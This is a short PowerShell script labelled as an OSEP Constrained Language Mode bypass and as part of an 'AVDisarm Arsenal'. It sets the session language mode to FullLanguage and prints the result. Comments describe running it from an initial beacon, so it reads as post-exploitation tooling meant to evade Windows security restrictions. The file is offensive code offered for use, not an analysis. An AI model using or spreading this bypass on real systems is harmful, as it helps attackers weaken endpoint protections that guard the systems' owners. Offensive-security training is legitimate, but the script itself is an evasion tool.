<#
.SYNOPSIS
    OSEP PowerShell CLM Bypass (PowerShell)
    Part of the AVDisarm Arsenal.
    Works at Medium Integrity.
#>

# NOTE: You cannot run this script directly in a CLM session to bypass it.
# You must either use the C# version via AssemblyLoader OR run the one-liner below
# from a context where you can execute code (like an initial beacon or a paste).

$ExecutionContext.SessionState.LanguageMode = "FullLanguage"

Write-Host "[!] If you can see this message without an error, you are in FullLanguage mode." -ForegroundColor Green
Write-Host "[*] Current Mode: $($ExecutionContext.SessionState.LanguageMode)" -ForegroundColor Cyan
